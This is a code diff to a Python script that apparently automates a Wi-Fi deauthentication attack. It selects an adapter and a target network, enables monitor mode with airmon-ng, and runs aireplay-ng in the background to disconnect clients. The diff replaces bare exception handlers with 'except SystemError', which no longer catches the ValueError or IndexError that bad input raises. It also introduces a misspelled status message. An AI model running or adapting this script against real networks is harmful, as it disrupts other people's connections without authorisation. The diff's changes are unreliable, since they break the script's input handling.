@@ -61,7 +61,7 @@ for file_name in os.listdir():
         try:
             # We make a new directory called /backup
             os.mkdir(directory + "/backup/")
-        except:
+        except SystemError:
             print("Backup folder exists.")
         # Create a timestamp
         timestamp = datetime.now()
@@ -100,7 +100,7 @@ while True:
     try:
         if check_wifi_result[int(wifi_interface_choice)]:
             break
-    except:
+    except SystemError:
         print("Please enter a number that corresponds with the choices.")
 
 # For easy reference we call the picked interface hacknic
@@ -206,7 +206,7 @@ while True:
     try:
         if active_wireless_networks[int(choice)]:
             break
-    except:
+    except SystemError:
         print("Please try again.")
 
 # To make it easier to work with we assign the results to variables.
@@ -217,7 +217,7 @@ hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
 # Monitoring takes place on a different channel and we need to set it to that channel.
 subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
 
-# Deauthenticate clients. We run it with Popen and we send the output to subprocess.DEVNULL and the errors to subprocess.DEVNULL. We will thus run deauthenticate in the background.
+# De-authenticate clients. We run it with Popen and we send the output to subprocess.DEVNULL and the errors to subprocess.DEVNULL. We will thus run de-authenticate in the background.
 subprocess.Popen(
     [
         "aireplay-ng",
@@ -231,10 +231,10 @@ subprocess.Popen(
     stderr=subprocess.DEVNULL,
 )
 
-# We run an infinite loop which you can quit by presses ctrl-c. The deauthentication will stop when we stop the script.
+# We run an infinite loop which you can quit by presses ctrl-c. The de-authentication will stop when we stop the script.
 try:
     while True:
-        print("Deauthenticating clients, press ctrl-c to stop")
+        print("Deuthenticating clients, press ctrl-c to stop")
 except KeyboardInterrupt:
     print("Stop monitoring mode")
     # We run a subprocess.run command where we stop monitoring mode on the network adapter.
